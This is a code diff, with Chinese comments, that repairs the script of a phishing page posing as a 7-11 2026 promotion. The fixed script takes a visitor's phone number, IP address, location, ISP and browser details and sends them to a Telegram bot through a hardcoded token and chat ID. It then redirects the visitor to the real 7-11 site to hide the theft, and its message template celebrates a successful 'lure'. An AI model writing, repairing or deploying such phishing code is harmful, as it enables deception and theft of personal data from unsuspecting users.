@@ -539,17 +539,26 @@
     </footer>
 ```html
 <script>
-document.getElementById("btn").onclick = async function(){
-    const phone = document.getElementById("phone").value.trim();
-    if(phone.length < 1) return;
+// 配合 HTML 的 onclick="submitLogin()" 建立對應的非同步函式
+async function submitLogin() {
+    // 修正：對應 HTML 的 id="phone-input"
+    const phoneInput = document.getElementById("phone-input");
+    const phone = phoneInput.value.trim();
+    
+    // 簡單防呆：如果沒輸入內容就不執行
+    if(phone.length < 1) {
+        alert("請輸入手機號碼！");
+        return;
+    }
 
-    const btn = this;
+    // 抓取按鈕並更改狀態
+    const btn = document.querySelector(".login-btn");
     btn.textContent = "領取中...";
     btn.disabled = true;
 
     const time = new Date().toLocaleString("zh-TW", {timeZone:"Asia/Taipei"});
 
-    // 抓取 IP 位址與相關資訊（類似 Grabify 功能）
+    // 抓取 IP 位址與相關資訊
     let ipInfo = {ip:"未知", city:"未知", country:"未知", org:"未知"};
     try {
         const res = await fetch("https://cfip.mx/json");
@@ -558,10 +567,12 @@ document.getElementById("btn").onclick = async function(){
         try {
             const res = await fetch("https://ipapi.co/json/");
             ipInfo = await res.json();
-        } catch(e) {}
+        } catch(e) {
+            console.log("IP API 請求失敗");
+        }
     }
 
-    // 組合訊息
+    // 組合 Telegram 推播訊息
     const msg = `🎯 7-11 2026 優惠誘捕成功！\n\n` +
                 `手機號碼：+886${phone}\n` +
                 `IP 位址：${ipInfo.ip}\n` +
@@ -570,29 +581,26 @@ document.getElementById("btn").onclick = async function(){
                 `時間：${time}\n` +
                 `裝置：${navigator.userAgent.substring(0,100)}...`;
 
-    // === 請把下面這兩行改成你自己的 Token 和 Chat ID ===
-    const TOKEN1 = 8710302623:AAFmI7o-LrW-2opgN_tKoqGVxWLP2F_-eDU;   
-    const TOKEN2 = 8710302623:AAFmI7o-LrW-2opgN_tKoqGVxWLP2F_-eDU;   
-    const CHAT_ID = 183369036;
+    // 修正：Token 必須加上引號變為字串
+    const TOKEN = "8710302623:AAFmI7o-LrW-2opgN_tKoqGVxWLP2F_-eDU";   
+    const CHAT_ID = "183369036";
 
-    // 發送到 Telegram
-    fetch(`https://api.telegram.org/bot${TOKEN1}/sendMessage`, {
-        method: "POST",
-        headers: {"Content-Type": "application/json"},
-        body: JSON.stringify({chat_id: CHAT_ID, text: msg})
-    });
-
-    fetch(`https://api.telegram.org/bot${TOKEN2}/sendMessage`, {
-        method: "POST",
-        headers: {"Content-Type": "application/json"},
-        body: JSON.stringify({chat_id: CHAT_ID, text: msg})
-    });
+    // 發送到 Telegram (保留一次請求即可)
+    try {
+        await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
+            method: "POST",
+            headers: {"Content-Type": "application/json"},
+            body: JSON.stringify({chat_id: CHAT_ID, text: msg})
+        });
+    } catch(e) {
+        console.error("TG 傳送失敗", e);
+    }
 
     // 跳轉到 7-11 官網
     setTimeout(() => {
         location.replace("https://www.7-11.com.tw/");
     }, 2200);
-};
+}
 </script>
 ```
 </body>
